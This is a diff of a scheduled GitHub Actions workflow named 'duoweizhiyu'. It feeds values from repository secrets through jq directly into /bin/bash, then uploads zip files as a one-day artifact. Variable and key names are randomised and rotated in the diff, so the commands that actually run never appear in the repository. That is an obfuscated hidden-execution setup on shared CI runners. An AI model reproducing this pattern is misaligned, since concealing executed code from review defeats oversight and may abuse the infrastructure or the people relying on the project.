@@ -1,34 +1,30 @@
 name: duoweizhiyu
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '44 2/6 * * *'
-jobs:  # 1466
+    - cron: '2 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: duoweizhiyu
         env:
-          tsuu90092: ${{ secrets.tsuu90092 }}
+          x74: ${{ secrets.x74 }}
         run: |
-          echo $tsuu90092 | jq -r .wao3 | /bin/bash
-          echo $ojz5 | jq -r .fl0257 | /bin/bash
-          echo $v511 | jq -r .jftt3 | /bin/bash
-          echo $upnzr955 | jq -r .jl014 | /bin/bash
-          echo $ojrb62957 | jq -r .soqgh33772 | /bin/bash
-          echo $abbqa5454 | jq -r .q04 | /bin/bash
-          echo $olm12 | jq -r .lvij050 | /bin/bash
-          echo $edq4 | jq -r .hivm62 | /bin/bash
-          echo $adf6631 | jq -r .c3920 | /bin/bash
-          echo $l8 | jq -r .bzgjr3849 | /bin/bash
-          echo $tgo95185 | jq -r .heuk20894 | /bin/bash
-          echo $akajv0 | jq -r .ao36 | /bin/bash
-          echo $wwz9 | jq -r .dvj0 | /bin/bash
-          echo $mf90 | jq -r .zs7 | /bin/bash
-          echo $cn0 | jq -r .nvb7 | /bin/bash
-          echo $nlg90887 | jq -r .iey3286 | /bin/bash
-          echo $aterm06368 | jq -r .trahr7436 | /bin/bash
-          echo $xuwma1200 | jq -r .qkxpu71301 | /bin/bash
+          printf '%s' "$x74" | jq -r .zme88400 | /bin/bash
+          printf '%s' "$aeds14" | jq -r .vu80035 | /bin/bash
+          printf '%s' "$kdm03" | jq -r .v4 | /bin/bash
+          printf '%s' "$asxa21729" | jq -r .uu40 | /bin/bash
+          printf '%s' "$essd617" | jq -r .kyqq7 | /bin/bash
+          printf '%s' "$km39614" | jq -r .o89 | /bin/bash
+          echo $opab4384 | jq -r .xm9738 | /bin/bash
+          printf '%s' "$zszd48" | jq -r .l26 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: pQLfogOz
+          path: "*.zip"
+          retention-days: 1
